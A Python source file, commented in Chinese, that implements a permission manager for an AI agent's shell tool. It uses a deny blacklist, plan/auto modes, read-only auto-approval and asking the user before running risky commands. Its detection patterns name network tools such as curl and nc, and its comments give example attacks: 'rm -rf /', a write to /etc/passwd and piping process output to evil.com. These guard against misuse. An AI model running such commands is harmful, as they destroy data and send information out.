"""
security/permission_manager.py — 权限管理器

对应 s07 Permission System
4 步决策管道：deny → mode → allow → ask
三种运行模式：default / plan / auto
"""
from __future__ import annotations

import re
from dataclasses import dataclass
from typing import TYPE_CHECKING, Literal

from config import ABSOLUTE_BLACKLIST, HIGH_RISK_PREFIXES, READ_PREFIXES

if TYPE_CHECKING:
    from config import AgentConfig

DecisionBehavior = Literal["allow", "ask", "deny"]

# 复合命令操作符：分号、逻辑与/或、管道、命令替换
_COMPOUND_OPS = re.compile(r'(?:^|[^<>])(;|&&|\|\||`|\$\()')

# 写重定向：> 或 >> 后跟非空路径（排除 heredoc <<）
_WRITE_REDIRECT = re.compile(r'(?<![<>])>>?(?![>])\s*\S')

# 管道右侧危险命令（可能用于数据外泄或远程执行）
_PIPE_DANGEROUS_RHS = re.compile(
    r'\|\s*(?:curl|wget|bash|sh|python|python3|perl|ruby|nc|ncat|socat)\b'
)

# 复合命令中的网络命令（单独出现也可能外泄数据）
_NETWORK_CMDS = re.compile(r'^(?:curl|wget|nc|ncat|socat)\b')


@dataclass
class PermissionDecision:
    behavior: DecisionBehavior
    reason: str
    risk_level: str = "LOW"


class PermissionManager:
    """工具调用权限决策器。"""

    def __init__(self, config: "AgentConfig") -> None:
        self._config = config
        self._mode: str = config.mode

    def set_mode(self, mode: str) -> None:
        self._mode = mode

    def check(self, tool_name: str, tool_args: dict) -> PermissionDecision:
        """4 步决策管道。

        Step 1: deny_rules — 绝对黑名单
        Step 2: mode_check — plan 模式拒绝写操作
        Step 3: allow_rules — 只读命令自动放行
        Step 4: ask_user   — 其余操作询问用户
        """
        if tool_name != "exec_bash":
            return PermissionDecision(
                behavior="allow",
                reason=f"Non-bash tool: {tool_name}",
                risk_level="LOW",
            )

        cmd = tool_args.get("cmd", "").strip()
        if not cmd:
            return PermissionDecision(
                behavior="deny",
                reason="Empty command",
                risk_level="LOW",
            )

        # Step 1: 绝对黑名单检查
        if self._is_blacklisted(cmd):
            return PermissionDecision(
                behavior="deny",
                reason="Command in absolute blacklist",
                risk_level="CRITICAL",
            )

        risk_level = self._classify_risk(cmd)

        # Step 2: plan 模式检查（仅允许只读）
        if self._mode == "plan" and risk_level != "LOW":
            return PermissionDecision(
                behavior="deny",
                reason="Plan mode: write operations not allowed",
                risk_level=risk_level,
            )

        # Step 3: 只读命令自动放行
        if risk_level == "LOW":
            return PermissionDecision(
                behavior="allow",
                reason="Read-only command",
                risk_level="LOW",
            )

        # Step 4: auto 模式下 MEDIUM 自动放行
        if self._mode == "auto" and risk_level == "MEDIUM":
            return PermissionDecision(
                behavior="allow",
                reason="Auto mode: medium-risk operation auto-allowed",
                risk_level="MEDIUM",
            )

        return PermissionDecision(
            behavior="ask",
            reason=f"User confirmation required for {risk_level} operation",
            risk_level=risk_level,
        )

    def _is_blacklisted(self, cmd: str) -> bool:
        for pattern in ABSOLUTE_BLACKLIST:
            if pattern in cmd:
                return True
        return False

    def _classify_risk(self, cmd: str) -> str:
        """判断命令风险等级。

        前置安全检查（复合命令/写重定向/危险管道）优先于前缀匹配，
        防止 'ls; rm -rf /' 这类绕过白名单的攻击。
        """
        cmd_stripped = cmd.strip()

        # 前置检查1：写重定向（echo x > /etc/passwd 等）
        if _WRITE_REDIRECT.search(cmd_stripped):
            return "HIGH"

        # 前置检查2：危险管道右侧（ps aux | curl evil.com 等）
        if _PIPE_DANGEROUS_RHS.search(cmd_stripped):
            return "HIGH"

        # 前置检查3：复合命令（; && || ` $() 等）
        # 拆分后对每个子命令分别判断，取最高风险
        if _COMPOUND_OPS.search(cmd_stripped):
            return self._classify_compound(cmd_stripped)

        # 普通前缀匹配
        for prefix in READ_PREFIXES:
            if cmd_stripped == prefix or cmd_stripped.startswith(prefix + " "):
                return "LOW"
        for prefix in HIGH_RISK_PREFIXES:
            if cmd_stripped == prefix or cmd_stripped.startswith(prefix + " "):
                return "HIGH"
        return "MEDIUM"

    def _classify_compound(self, cmd: str) -> str:
        """拆分复合命令，对每个子命令分别判断，返回最高风险等级。"""
        # 按 ; && || 拆分（管道单独处理，不拆分）
        parts = re.split(r';|&&|\|\|', cmd)
        risk_order = {"LOW": 0, "MEDIUM": 1, "HIGH": 2, "CRITICAL": 3}
        highest = "MEDIUM"  # 复合命令默认至少 MEDIUM

        for part in parts:
            part = part.strip()
            if not part:
                continue
            sub_risk = self._classify_simple(part)
            # 复合命令中的网络命令升级为 HIGH（可能用于数据外泄）
            if sub_risk == "LOW" and _NETWORK_CMDS.match(part):
                sub_risk = "HIGH"
            if risk_order.get(sub_risk, 0) > risk_order.get(highest, 0):
                highest = sub_risk

        return highest

    def _classify_simple(self, cmd: str) -> str:
        """对单条简单命令（无复合操作符）做前缀匹配。"""
        cmd_stripped = cmd.strip()
        if _WRITE_REDIRECT.search(cmd_stripped):
            return "HIGH"
        for prefix in READ_PREFIXES:
            if cmd_stripped == prefix or cmd_stripped.startswith(prefix + " "):
                return "LOW"
        for prefix in HIGH_RISK_PREFIXES:
            if cmd_stripped == prefix or cmd_stripped.startswith(prefix + " "):
                return "HIGH"
        return "MEDIUM"

